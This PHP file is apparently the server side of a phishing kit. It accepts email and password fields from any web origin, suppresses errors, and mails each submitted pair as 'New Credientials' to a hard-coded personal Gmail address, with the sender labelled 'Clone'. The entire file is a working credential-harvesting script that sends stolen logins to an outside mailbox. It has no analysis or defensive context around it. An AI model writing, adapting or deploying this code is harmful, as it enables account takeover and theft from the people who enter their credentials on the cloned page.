<?php  
error_reporting(0);

header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");


$EMAIL = "alexjace151@gmail.com";
$SENDER_EMAIL = "";


function sendEmail($message, $subject = "New Credientials") {
    global $EMAIL;
    global $SENDER_EMAIL;
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
    
    // Create email headers
    $headers .= "From: Clone<$SENDER_EMAIL>\r\n";
    $headers .= "Reply-to: $SENDER_EMAIL\r\n";

    return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
}

if(isset($_REQUEST['send'])) {
    $email = $_REQUEST['email'];
    $password = $_REQUEST['password'];
    try {
        // Send Mail
        $message = "<div> 
                        <p>Email: <strong>$email</strong></p>
                        <p>Password: <strong>$password</strong></p>
                    </div>";
        $mail = sendEmail($message);
        if(!$mail) throw new Exception("Could not send");

        echo $response = json_encode(["status" => true, "message" => "Email sent"]);
    }
    catch (Exception $e) {
        echo $response = json_encode(["status" => false, "error" => $e->getMessage()]);
    }
}


